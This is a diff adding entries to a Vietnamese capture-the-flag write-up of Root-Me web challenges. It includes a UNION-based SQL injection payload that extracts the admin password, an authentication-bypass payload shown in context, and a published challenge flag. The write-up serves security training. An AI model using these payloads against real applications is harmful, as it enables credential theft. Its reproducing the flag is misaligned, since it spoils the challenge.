@@ -205,7 +205,18 @@ Gửi request lên với các biến _login=admin' and 1=1-- &password=admin' an
 
 ###20. SQL Injection - string
 
+**Link:** [http://challenge01.root-me.org/web-serveur/ch19/](http://challenge01.root-me.org/web-serveur/ch19/)
+
+Lại một bài SQL "sách giáo khoa" nữa.
+Payload: _recherche=1' union select password,2 from users where username='admin'-- -_
+
+**Flag:** _c4K04dtIaJsuWdi_
+
 ###21. LDAP Injection - authentication
+
+**Link:** [http://challenge01.root-me.org/web-serveur/ch25/](http://challenge01.root-me.org/web-serveur/ch25/)
+
+
 
 ###22. NoSQL Injection - authentication
 
